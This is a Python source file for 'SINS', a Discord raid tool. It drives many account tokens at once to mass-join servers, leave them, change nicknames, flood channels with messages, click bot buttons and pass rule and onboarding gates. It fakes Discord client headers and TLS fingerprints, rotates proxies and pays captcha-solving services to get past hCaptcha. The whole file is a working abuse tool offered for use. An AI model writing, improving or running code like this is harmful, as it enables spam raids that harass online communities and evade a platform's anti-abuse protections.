try:
    import os
    from colorama import Fore
    from colorist import ColorHex as h
    from datetime import datetime
    import base64
    import json
    import random
    import requests
    import string
    import threading
    import time
    import tls_client
    import uuid
    import websocket
except ModuleNotFoundError:
    os.system('title Installing dependencies')
    i = 0
    imports = [
        'requests', 
        'colorama', 
        'websocket', 
        'websocket-client', 
        'uuid', 
        'datetime', 
        'tls_client', 
        'colorist'
    ]
    for _import in imports:
        i += 1
        os.system('cls')
        print(f"Installing dependencies... ({i}/8)")
        print(f"installing {_import}")
        os.system(f'pip install {_import} > nul')
    print('Finishing up...')
    from colorama import Fore
    from colorist import ColorHex as h
    from datetime import datetime
    import base64
    import json
    import random
    import requests
    import string
    import threading
    import time
    import tls_client
    import uuid

os.system('cls')
os.system('title SINS - discord.gg/Encoders')

session = tls_client.Session(client_identifier="chrome_108",random_tls_extension_order=True)

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Color": "light_blue",
                    "Solver": "False",
                    "Service": "capsolver",
                    "Api-Key": "",
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = [
            "data", 
            "scraped"
        ]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("FAILED", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = [
            "tokens.txt", 
            "proxies.txt"
        ]
        for file in files:
            try:
                if not os.path.exists(file):
                    with open(f"data/{file}", "a") as f:
                        f.close()
            except Exception as e:
                console.log("FAILED", C["red"], "Failed to Write Files", e)

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()


with open("data/proxies.txt") as f:
    proxies = f.read().splitlines()

with open("config.json") as f:
    Config = json.load(f)

with open("data/tokens.txt", "r") as f:
    tokens = f.read().splitlines()

proxy = Config["Proxies"]
color = Config["Color"]
solver = Config["Solver"]
service = Config["Service"]
Key = Config["Api-Key"]


if proxy:
    if proxies:
        session.proxies = {
            "http": f"http://{random.choice(proxies)}",
            "https": f"http://{random.choice(proxies)}",
        }
    else:
        pass
else:
    pass

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
}

class Render:
    def __init__(self):
        self.size = os.get_terminal_size().columns
        if not color:
            self.background = C['light_blue']
        else:
            self.background = C[color]

    def render_ascii(self):
        os.system('cls')
        os.system(f'title SINS - Loaded {len(tokens)} tokens')
        edges = ["╗", "║", "╚", "╝", "═", "╔"]


    def raider_options(self):
        with open("data/proxies.txt") as f:
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"] 
        title = f"""
{'╭───────────────────────────────────────────────────────╮'.center(self.size)}
{'│ «01» Joiner                 «05» Rules Accepter       │'.center(self.size)}
{'│ «02» Leaver                 «06» Button Clicker       │'.center(self.size)}
{'│ «03» Nickname changer       «07» Onboard Bypass       │'.center(self.size)}
{'│ «04» Spammer                «08» Exit                 │'.center(self.size)}
{'╰───────────────────────────────────────────────────────╯'.center(self.size)}
{'SINS - discord.gg/Encoders'.center(self.size)}
"""
        for edge in edges:
            title = title.replace(edge, f"{self.background}{edge}{C['white']}")
        print(title)

    def run(self):
        options = [self.render_ascii(), self.raider_options()]
        ([option] for option in options)

    def log(self, text=None, color=None, token=None, log=None):
        response = f" "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"
        print(response)

    def prompt(self, text, ask=None):
        response = f"[{C[f'{color}']}{text}{C['white']}"
        if ask:
            response += f"? {C['gray']}(y/n){C['white']}]: "
        else:
            response += f"]: "
        return response

console = Render()

def get_random_str(length: int) -> str:
    return "".join(
        random.choice(string.ascii_letters + string.digits) for _ in range(length)
    )

def ashes(func):
    def ashes(*args, **kwargs):
        os.system('cls')
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return ashes


class Solver:
    def __init__(self):
        with open("config.json") as f:
            config = json.load(f)
        self.key = config["Api-Key"]
        self.session = requests.Session()


    def solve_2cap(self,site_key, page_url):
        time_start = time.time()
        url = f"https://2captcha.com/in.php?key={Key}&method=hcaptcha&sitekey={site_key}&pageurl={page_url}"
        response = session.get(url)
        if response.text[0:2] == 'OK':
            captcha_id = response.text[3:]
            url = f"http://2captcha.com/res.php?key={Key}&action=get&id={captcha_id}"
            response = session.get(url)
            while 'CAPCHA_NOT_READY' in response.text:
                time.sleep(5)
                response = session.get(url)
            return response.text.replace('OK|','') , str(time.time() - time_start)
        else:
            print(f'Error: {response.text}')
            return False
    def solve_capmonster(self, site_key, page_url   ):
        
        
        
        url = "https://api.capmonster.cloud/createTask"
        data = {
            "clientKey": Key,
            "task": {
                "type": "HCaptchaTaskProxyless",
                "websiteURL": page_url,
                "websiteKey": site_key
            }
        }
        response = requests.post(url, json=data)
        
        if response.json()['errorId'] == 0:
            task_id = response.json()['taskId']
            url = "https://api.capmonster.cloud/getTaskResult"
            data = {
                "clientKey":Key,
                "taskId": task_id
            }
            response = requests.post(url, json=data)
            
            while response.json()['status'] == 'processing':
                time.sleep(3.5)
                response = requests.post(url, json=data)
            answer = response.json()['solution']['gRecaptchaResponse']
        
            return answer
            
        else:
            print('Error: {}'.format(response.json()['errorDescription']))
            return False
        
    def solve_hcop(self, site_key, page_url, proxy):
        create_task_url = "https://api.hcoptcha.com/api/createTask"
        get_task_result_url = "https://api.hcoptcha.com/api/getTaskData"
        
        data = {
            "task_type": "hcaptchaEnterprise",
            "api_key": self.key,
            "data": {
                "sitekey": site_key,
                "url": page_url,
                "proxy": proxy, 
            }
        }
        
        response = self.session.post(create_task_url, json=data)
        if response.status_code == 200 and not response.json().get("error"):
            task_id = response.json()["task_id"]
            result_data = {
                "api_key": self.key,
                "task_id": task_id
            }
            while True:
                time.sleep(1.5)
                result_response = self.session.post(get_task_result_url, json=result_data)
                result_json = result_response.json()
                if result_json["task"]["state"] == "completed":
                    return result_json["task"]["captcha_key"]
                elif result_json["task"]["state"] == "error":
                    print('Error: {}'.format(result_json))
                    return False
        else:
            print('Error: {}'.format(response.json()))
            return False
        
    def solve_capsolver(self, site_key, page_url):
        payload = {
            "clientKey": self.key,
            "task": {
                "type": "HCaptchaTaskProxyLess",
                "websiteURL": page_url,
                "websiteKey": site_key,
            }
        }

        headers = {
            'Content-Type': 'application/json'
        }

        response = self.session.post('https://api.capsolver.com/createTask', headers=headers, json=payload)
        try:
            task_id = response.json()['taskId']
        except KeyError:
            print('Error:', response.json().get('errorDescription', 'Unknown error'))
            return 

        payload = {
            "clientKey": self.key, 
            "taskId": task_id
        }

        while True:
            time.sleep(1.5)
            response = self.session.post('https://api.capsolver.com/getTaskResult', headers=headers, json=payload)
            if response.json()['status'] == 'ready':
                captcha_key = response.json()['solution']['gRecaptchaResponse']
                return captcha_key
            elif response.json().get('errorId'):
                print('Error:', response.json().get('errorDescription', 'Unknown error'))
                return
            else:
                continue
            
class Raider:
    def __init__(self):
        self.cookies = self.get_discord_cookies()
        self.props = self.super_properties()            

    def get_discord_cookies(self):
        try:
            response = requests.get("https://canary.discord.com")
            match response.status_code:
                case 200:
                    return "; ".join(
                        [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                    ) + "; locale=en-US"
                case _:
                    return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"
        except Exception as e:
            console.log(C["red"], "(ERR)", e, "(get_discord_cookies)")

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Discord Client",
                "release_channel": "stable",
                "client_version": "1.0.9030",
                "os_version": "10.0.19045",
                "system_locale": "en",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9030 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
                "browser_version": "22.3.26",
                "client_build_number": 258589,
                "native_build_number": 42627,
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log(C["red"], "(ERR)", e, "(get_super_properties)")

    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9030 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "x-discord-locale": "en-US",
            'x-debug-options': 'bugReporterEnabled',
            "x-super-properties": self.props,
        }
    
    def nonce(self):
        return str((int(time.mktime(datetime.now().timetuple())) * 1000 - 1420070400000) * 4194304)

    def joiner(self, token, invite):
        try:
            data = {
                "session_id": uuid.uuid4().hex
            }

            response = session.post(
                f"https://canary.discord.com/api/v9/invites/{invite}",
                headers=self.headers(token),
                json=data
            )

            match response.status_code:
                case 200:
                    console.log(f"JOINED", C["green"], f"{Fore.RESET}{token[:25]}.")
                case 400:
                    console.log("CAPTCHA", C["yellow"], f"{Fore.RESET}{token[:25]}.")
                    if solver == "True":
                        if service == "capsolver":
                         payload = {
                         "captcha_key": Solver().solve_capsolver(site_key='4c672d35-0701-42b2-88c3-78380b0db560', page_url='https://discord.com/')
                        }
                        elif service == "capmonster":
                         payload = {
                         "captcha_key": Solver().solve_capmonster(site_key='4c672d35-0701-42b2-88c3-78380b0db560', page_url='https://discord.com/')
                        }
                        elif service == "hcop":
                            payload = {
                                "captcha_key": Solver().solve_hcop(site_key='4c672d35-0701-42b2-88c3-78380b0db560', page_url='https://discord.com/', proxy='103.124.137.31:3128')
                            }
                        elif service == "2cap":
                         payload = {
                         "captcha_key": Solver().solve_2cap(site_key='4c672d35-0701-42b2-88c3-78380b0db560', page_url='https://discord.com/')
                        }

                        newresponse = session.post(
                            f"https://discord.com/api/v9/invites/{invite}",
                            headers=self.headers(token), 
                            json=payload
                        )
                        match newresponse.status_code:
                            case 200:
                                console.log(f"JOINED", C["green"], f"{Fore.RESET}{token[:25]}.", f"{response.json()['guild']['name']}")
                            case _:
                                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", response.json().get("message"))
                    else:
                        pass
                case 429:
                    console.log("CLOUDFARE", C["magenta"], f"{Fore.RESET}{token[:25]}.")
                case _:
                    console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", response.json().get("message"))
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", e)

    def leaver(self, token, guild):
        try:
            def get_guild_name(guild):
                in_guild = []
                for token in tokens:
                    response = session.get(
                        f"https://canary.discord.com/api/v9/guilds/{guild}",
                        headers=self.headers(token)
                    )

                    match response.status_code:
                        case 200:
                            in_guild.append(token)
                            try:
                                return response.json().get("name")
                            except:
                                return guild
                if not in_guild:
                    return guild
            self.guild = get_guild_name(guild)

            payload = {
                "lurking": False,
            }

            while True:
                response = session.delete(
                    f"https://canary.discord.com/api/v9/users/@me/guilds/{guild}",
                    json=payload,
                    headers=self.headers(token)
                )

                match response.status_code:
                    case 204:
                        console.log("LEFT", C["green"], f"{Fore.RESET}{token[:25]}.")
                        break
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", response.json().get("message"))
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", e)

    def spammer(self, token, channel, message=None, delay=500):
        try:
            payload = {
                "content": message
            }
            while True:
                response = session.post(
                    f"https://canary.discord.com/api/v9/channels/{channel}/messages",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.")
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.", response.json().get("message"))
                        return
                        break
                if delay > 0:
                    time.sleep(delay / 1000.0)
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", e)

    def accept_rules(self, guild_id):
        try:
            valid = []
            with open("data/tokens.txt", "r") as f:
                tokens = f.read().splitlines()
            for token in tokens:
                value = session.get(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/member-verification",
                    headers=self.headers(token)
                )

                match value.status_code:
                    case 200:
                        valid.append(token)
                        payload = value.json()
                        break

            if not valid:
                console.log("FAILED", C["red"], "All tokens are Invalid")
                Menu().main_menu(True)

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Accept Rules", e)

        def run_main(token):
            try:
                response = session.put(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/requests/@me",
                    headers=self.headers(token),
                    json=payload
                )
                
                match response.status_code:
                    case 201:
                        console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.")
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.", response.json().get("message"))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.", e)

        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        args = [
            (token, ) for token in tokens
        ]
        Menu().run(run_main, args)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                'nick' : nick
            }

            while True:
                response = session.patch(
                    f"https://canary.discord.com/api/v9/guilds/{guild}/members/@me", 
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.")
                        break
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.", response.json().get("message"))
                        break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.", e)

    def button_bypass(self, token, message_id, channel_id, guild_id, optionbutton):
        try:
            payload = {
                'limit': '50',
                'around': message_id,
            }

            response = session.get(
                f'https://canary.discord.com/api/v9/channels/{channel_id}/messages',
                params=payload,
                headers=self.headers(token)
            )

            messages = response.json()
            messagebottoclick = next((x for x in messages if x["id"] == message_id), None)

            if messagebottoclick is None:
                pass

            buttons = []

            for x in messagebottoclick["components"]:
                buttons.append(x["components"][0])

            data = {
                'application_id': messagebottoclick["author"]["id"],
                'channel_id': channel_id,
                'data': {
                    'component_type': 2,
                    'custom_id': buttons[int(optionbutton)]["custom_id"],
                },
                'guild_id': guild_id,
                'message_flags': 0,
                'message_id': message_id,
                'nonce': self.nonce(),
                'session_id': uuid.uuid4().hex,
                'type': 3,
            }

            respons = session.post(
                'https://canary.discord.com/api/v9/interactions',
                headers=self.headers(token),
                json=data
            )

            match respons.status_code:
                case 204:
                    console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.", respons.json().get("message"))
        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Click Button", e)

    def onboard_bypass(self, guild_id):
        try:
            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []
            in_guild = []

            with open("data/tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            for _token in tokens:
                response = session.get(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/onboarding",
                    headers=self.headers(_token)
                )
                if response.status_code == 200:
                    in_guild.append(_token)
                    break

            if not in_guild:
                console.log("FAILED", C["red"], "Missing Access")
                Menu().main_menu(True)
            else:
                data = response.json()
                now = int(datetime.now().timestamp())

                for __ in data["prompts"]:
                    onboarding_responses.append(__["options"][-1]["id"])

                    onboarding_prompts_seen[__["id"]] = now

                    for prompt in __["options"]:
                        if prompt:
                            onboarding_responses_seen[prompt["id"]] = now
                        else:
                            console.log(
                                "FAILED",
                                C["red"],
                                "No onboarding in This Server",
                            )
                            Menu().main_menu(True)

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Pass Onboard", e)
            Menu().main_menu(True)

        def run_task(token):
            try:
                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }

                response = session.post(
                    f"https://canary.discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=self.headers(token),
                    json=json_data
                )

                if response.status_code == 200:
                    console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.WHITE}**")
                else:
                    console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.WHITE}**", response.json().get("message"))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.WHITE}**", e)

        args = [
            (token,) for token in tokens
        ]
        Menu().run(run_task, args)

class Menu:
    def __init__(self):
        self.raider = Raider()
        self.options = {
            "1": self.joiner, 
            "2": self.leaver,
            "3": self.nick_changer,
            "4": self.spammer,
            "5": self.accept,
            "6": self.button,
            "7": self.onboard
            
        }

    def main_menu(self, _input=None):
        if _input:
            input()
        console.run()
        choice = input(f"{' '*4}{Fore.WHITE}> {Fore.RESET}")
        if choice in self.options:
            console.render_ascii()
            self.options[choice]()
        else:
            self.main_menu()

    def run(self, func, args):
        threads = []
        os.system('cls')
        console.render_ascii()
        for arg in args:
            thread = threading.Thread(target=func, args=arg)
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        input("\n ~/> press enter to continue ")
        self.main_menu()


    @ashes
    def nick_changer(self):
        os.system('title Sins Nick Changer')
        nick = input(console.prompt("Nick"))
        if nick == "":
            Menu().main_menu()
        os.system('cls')
        console.render_ascii()
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            Menu().main_menu()
        os.system('cls')
        console.render_ascii()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)

    @ashes
    def joiner(self):
        os.system('title Sins Joiner')
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            Menu().main_menu()
        invite = invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "").replace("https://discord.com/invite/", "").replace(".gg/", "").replace("https://canary.", "").replace("canary.", "")
        os.system('cls')
        console.render_ascii()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        args = [
            (token, invite) for token in tokens
        ]
        self.run(self.raider.joiner, args)

    @ashes 
    def leaver(self):
        os.system('title Sins Server Leaver')
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            Menu().main_menu()
        os.system('cls')
        console.render_ascii()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        args = [
            (token, guild) for token in tokens
        ]
        self.run(self.raider.leaver, args)

    @ashes
    def spammer(self):
        os.system('title Sins Spammer')
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "":
            Menu().main_menu()
        if Link.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        os.system('cls')
        console.render_ascii()
        message = input(console.prompt("Message"))
        if message == "":
            Menu().main_menu()

        try:
            delay = float(input(console.prompt("Delay (ms)")))
        except ValueError:
            delay = 300  

        args = [
            (token, channel_id, message, delay) for token in tokens
        ]
        self.run(self.raider.spammer, args)

    @ashes
    def button(self):
        os.system('title Sins Button Clicker')
        message = input(console.prompt("Message Link"))
        if message == "":
            Menu().main_menu()
        if message.startswith("https://"):
            pass
        else:
            Menu().main_menu()
        guild_id = message.split("/")[4]
        channel_id = message.split("/")[5]
        message_id = message.split("/")[6]
        os.system('cls')
        console.render_ascii()
        print(f"{Fore.RESET}If there's 1 button {Fore.WHITE}press Enter{Fore.RESET}")
        optionbutton = input(f"{Fore.RESET}[{Fore.WHITE}Button Option{Fore.RESET}] → ")
        if optionbutton == "":
            optionbutton = 0
        os.system('cls')
        console.render_ascii()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        args = [
            (token, message_id, channel_id, guild_id, optionbutton) for token in tokens
        ]
        self.run(self.raider.button_bypass, args)

    @ashes
    def accept(self):
        os.system('title Sins Rules Accepter')
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            Menu().main_menu()
        os.system('cls')
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @ashes
    def onboard(self):
        os.system('title Sins Onboard Bypass')
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            Menu().main_menu()
        os.system('cls')
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)



if __name__ == "__main__":
    Menu().main_menu()
